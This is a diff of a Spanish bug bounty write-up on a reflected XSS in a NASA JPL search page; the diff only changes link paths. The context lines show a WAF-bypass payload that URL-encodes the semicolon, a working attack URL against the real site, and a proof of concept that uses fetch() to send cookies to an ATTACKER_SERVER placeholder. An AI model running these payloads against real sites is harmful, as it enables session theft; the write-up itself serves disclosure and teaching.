@@ -1,6 +1,6 @@
 # NASA JPL: Reflected XSS en Formulario de Búsqueda y Exfiltración de Cookies
 
-[English (EN)](./nasa-jpl-ecco-xss-waf-bypass.md)
+[English (EN)](../../en/bounties/nasa-jpl-ecco-xss-waf-bypass.md)
 
 ## Introducción
 
@@ -16,11 +16,11 @@ Al igual que en cualquier programa de bug bounty, el primer paso fue usar la pá
 
 Me di cuenta de que el valor que introducía se reflejaba directamente en el sitio web.
 
-![Búsqueda Normal](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png)
+![Búsqueda Normal](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png)
 
 Al inspeccionar el código fuente del sitio web, vi que la entrada estaba colocada dentro de una función JavaScript `console.log()`:
 
-![Resultado Búsqueda Normal](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png)
+![Resultado Búsqueda Normal](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png)
 
 ```javascript
 console.log('pwn');
@@ -36,7 +36,7 @@ Realicé pruebas básicas de XSS usando la etiqueta `<script>`:
 
 El Web Application Firewall (WAF) rechazó la solicitud a la mínima señal de actividad maliciosa (el tag `<script>`).
 
-![WAF bloqueando tag script](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)
+![WAF bloqueando tag script](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)
 
 ---
 
@@ -48,7 +48,7 @@ Decidí intentar cerrar la función `console.log()` para insertar código justo 
 
 El `')` cierra el string y la función. Sin embargo, noté que el punto y coma `;` no se mostraba en la salida, a pesar de haberlo introducido.
 
-![Cerrando console.log](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png)
+![Cerrando console.log](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png)
 
 ---
 
@@ -60,7 +60,7 @@ Intenté añadir más código después del punto y coma:
 
 El punto y coma seguía sin aparecer, y todo lo que iba detrás de él desaparecía del texto reflejado.
 
-![Dónde está el punto y coma](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png)
+![Dónde está el punto y coma](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png)
 
 ---
 
@@ -72,7 +72,7 @@ Para que funcionara, tuve que codificar el punto y coma en formato URL como `%3b
 
 A partir de ese momento, pude introducir código JavaScript para llevar a cabo el ataque.
 
-![Bypass de punto y coma](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png)
+![Bypass de punto y coma](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png)
 
 ---
 
@@ -86,9 +86,9 @@ Payload: `pwn')%3balert(1)</script>;//`
 
 Esto resultó en un **XSS Reflejado** exitoso.
 
-![Alert 1 HTML](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png)
+![Alert 1 HTML](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png)
 
-![Alert 1](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png)
+![Alert 1](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png)
 
 ---
 
@@ -100,7 +100,7 @@ Después de ejecutar un `alert()`, quise exfiltrar las cookies.
 
 El WAF rechazó la solicitud en cuanto detectó cadenas sospechosas como `document.cookie`.
 
-![WAF bloqueando document.cookie](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)
+![WAF bloqueando document.cookie](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)
 
 ---
 
@@ -112,9 +112,9 @@ Payload: `pwn')%3ba=document%3balert(a.cookie)</script>;//`
 
 `https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//`
 
-![Alerta de Cookies con Bypass](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png)
+![Alerta de Cookies con Bypass](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png)
 
-![Resultado de Cookies con Bypass](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png)
+![Resultado de Cookies con Bypass](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png)
 
 ```javascript
 pwn'); // Rompemos la lógica del sistema
@@ -131,9 +131,9 @@ La Prueba de Concepto (PoC) final consistió en usar `fetch()` para enviar las c
 
 Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>//`
 
-![Exfiltración de Cookies con Fetch](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png)
+![Exfiltración de Cookies con Fetch](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png)
 
-![Petición de Exfiltración Recibida](../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png)
+![Petición de Exfiltración Recibida](../../assets/images/nasa/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png)
 
 ---
 
